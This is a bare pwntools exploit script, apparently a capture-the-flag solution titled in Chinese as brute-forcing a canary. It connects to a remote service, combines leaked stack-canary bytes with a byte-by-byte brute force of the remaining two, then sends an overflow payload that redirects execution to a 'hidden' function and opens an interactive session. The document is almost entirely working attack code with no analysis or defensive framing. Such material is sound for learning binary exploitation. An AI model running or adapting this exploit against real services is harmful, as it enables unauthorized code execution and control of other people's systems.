爆破canary

```python
from pwn import *
import struct

# context.log_level='debug'
pname='./canary'
# p=process(pname)
context.terminal=['gnome-terminal','-x','sh','-c']
# p=gdb.debug(pname)
p=remote('10.10.175.100',9994)
elf=ELF(pname)
payload=b'a'*8
p.recvuntil(b"Don't tell others ^_^ ")
r=p.recvuntil(b' ')
c1=int(r.decode())
r=p.recvuntil(b'\n')
c2=int(r.decode())
info('c1=%08x,c2=%04x'%(c1,c2))
canary=[i for i in p32(c1)+p16(c2)]
for i in range(2):
    canary.append(0)
    print(i+6)
    for j in range(256):
        p.recvuntil(b"hello~\n")
        # print(i+1,hex(j))
        p.recv()
        canary[i+6]=j
        p.send(payload+bytes(canary))
        # p.recvuntil('hello~\n')
        r=p.recv(6)
        # print(r)
        if b'Maybe' in r:
            print('canary[%d]=%x'%(i+6,j))
            break
info('canary:%s'%(str(canary)))
payload=b'a'*8+bytes(canary)+p64(0)+p64(elf.sym['hidden'])
p.send(payload)
p.interactive()
```